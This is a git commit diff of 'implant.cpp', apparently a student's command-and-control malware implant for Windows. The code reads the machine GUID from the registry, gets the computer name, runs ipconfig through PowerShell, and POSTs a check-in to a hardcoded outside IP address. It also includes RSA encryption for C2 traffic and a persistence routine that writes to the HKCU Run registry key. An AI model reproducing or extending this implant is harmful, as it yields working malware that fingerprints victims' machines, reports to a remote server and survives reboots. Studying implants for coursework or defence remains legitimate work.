53dac89110d23c7fcb0f8bab6c5e7578596f85ea
Jason Chow <79327473+JasonChow320@users.noreply.github.com>
2021-12-08 23:57:25 -0500

    Update implant.cpp

--- implant/implant.cpp
+++ implant/implant.cpp
@@ -2,6 +2,8 @@
 #include <fstream>
 #include <iostream>
 #include "httpClient.h"
+#include "rsa.h"
+#include "base64.h"
 
 #define INFO_BUFFER_SIZE 32767
 
@@ -19,44 +21,72 @@ int wmain()
         MB_ICONWARNING | MB_CANCELTRYCONTINUE | MB_DEFBUTTON2
     );
 
-    // implant first checks the Computer Name and IP address. Then sends it to the c2
-    std::system("powershell ipconfig >C:\\Users\\User\\test.txt");
-    std::ifstream temp_file("C:\\Users\\User\\test.txt");
-    std::string first_impression((std::istreambuf_iterator<char>(temp_file)), std::istreambuf_iterator<char>());
-    std::remove("C:\\Users\\User\\test.txt");
-
     //get machine guid
     char value[255];
     DWORD BufferSize = sizeof(value);
+    printf("%d", BufferSize);
     if(getGUID(value, &BufferSize)){
         printf("Can't get machine guid\n");
     }
-    printf("%s :D\n", value);
+    for(size_t i = 0; i < BufferSize; i++){
+        printf("%c", value[i]);
+    }
 
     //get computer name
     char infoBuf[INFO_BUFFER_SIZE];
     DWORD bufCharCount = INFO_BUFFER_SIZE;
     GetComputerNameA((LPSTR)infoBuf, &bufCharCount);
-    first_impression.append(infoBuf);
-    printf("%s + %d\n%s\n", infoBuf, first_impression.size(), first_impression.c_str());
+    printf("*** size of buffer: %d\n", BufferSize);
+    for(size_t i = 0; i < bufCharCount; i++){
+        printf("%c", infoBuf[i]);
+    }
 
+    std::string checkin("{\"guido\": ");
+    std::string guid(value, BufferSize);
+    checkin += guid;
+    checkin += ", \"sleep\": ";
+    size_t range = 200000; // 100000 + range is the maximum value you allow
+    size_t number = 100000 + (rand() * range) / RAND_MAX;
+
+    //checkin += ", \"sleepTime\": "; //, \"sleepTime\": 33, \"computerName\": itsme, \"DHKEY\": nada}";
+    //checkin += number;
+    
     // if successful, connect to the server
     HTTP *client = new HTTP();
     int port = 5000, tls = 0;
-    client->connectToServer(L"localhost", port);
+    client->connectToServer(L"155.41.47.145", port);
     if(!client->checkConnection()){
         wprintf(L"Error, couldn't connect to server\n");
         return 1;
     }
 
-    client->additionalHeader = L"ch0nk: lol";
-    client->header_size = 10;
-    std::wcout << client->makeHttpRequest(L"GET", L"/", tls) << std::endl;
-    char jsonTest[] = "{\"Objectname\", \"hello :D\"";
-    client->requestData = (char*)first_impression.c_str();
-    client->data_size = first_impression.size();
+    // Checkin with the c2
+    std::wstring RSA_key = L"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtCpB9NABjMA/DT8W9cto6E48ak7zlPaG5l7K2SMqkzmS/VcGzx9aCduTpkKfJK6Fld9jOHCm2m8U+aTMIuB7eh0qJMrg/BU68r38BgpK7bmaZTrqgGEaBuutfAFkUkkNre9PEgutYjnrFquuvU/PnrKVMfRUhv5RF5rZVq9q2A3H9f2VVOnMD/J8871gEHX1khWtHwolrTPO4Uj4gJsoc3Dh45adKiqkBdR75E3U/ypGcWXre7tPdweVWXGCAYsxHwSj9PX2Yuuacb3i84AyP4+juqk09VFyv+3XNLbgW4dFgxrIBDtYuoVcuSVOfycFJYY/ve5zprullMDG9sHf/wIDAQAB";
+    printf("%d\n", RSA_key.size());
+    DWORD key_size;
+    decode(RSA_key, NULL, &key_size);
+    BYTE *bRSA_key = new BYTE[key_size];
+    decode(RSA_key, bRSA_key, &key_size);
+
+    RSA *rsa = new RSA(bRSA_key, key_size);
+    char test[] = "HEllo world";
+    rsa->Encrypt((BYTE*)test, 11);
+    printf("ciphertext: %s\n ciphertext size: %d\n", rsa->ciphertext, rsa->ptBufferSize);
+
+    client->additionalHeader = L"User-Agent: IWasBornInTheUSA";
+    client->header_size = 28;
+    client->requestData = (char*)checkin.c_str();
+    client->data_size = checkin.size();
+    std::wcout << client->makeHttpRequest(L"POST", L"/checkIn", tls) << std::endl;
     printf("size of data_size: %d\n", client->data_size);
-    std::wcout << client->makeHttpRequest(L"POST", L"/", tls) << std::endl;
+    //std::wcout << client->makeHttpRequest(L"POST", L"/jobs", tls) << std::endl;
+
+    // implant first checks the Computer Name and IP address. Then sends it to the c2
+    std::system("powershell ipconfig >C:\\Users\\User\\test.txt");
+    std::ifstream temp_file("C:\\Users\\User\\test.txt");
+    std::string first_impression((std::istreambuf_iterator<char>(temp_file)), std::istreambuf_iterator<char>());
+    std::remove("C:\\Users\\User\\test.txt");
+    printf("%s + %d\n%s\n", infoBuf, first_impression.size(), first_impression.c_str());
 
     delete client;
     return 0;
@@ -64,7 +94,7 @@ int wmain()
 
 // https://stackoverflow.com/questions/48432994/c-read-machine-guid-via-reggetvalue
 LONG getGUID(char* res, DWORD* size){
-    HKEY mykey;
+    HKEY mykey = NULL;
     auto result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ, &mykey);
     //LONG result = RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", RRF_RT_REG_SZ, NULL, res, size);
     if (result == 0){
@@ -79,7 +109,7 @@ LONG getGUID(char* res, DWORD* size){
 }
 
 LONG persistenceLOL(){
-    HKEY mykey;
+    HKEY mykey = NULL;
     LONG res = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &mykey);
     const char* czStartName = "trolllolol";
     const char* czExePath   = "\"C:\\Users\\user\\Desktop\\vs_programs\\Assignment-4\\a.exe\"";
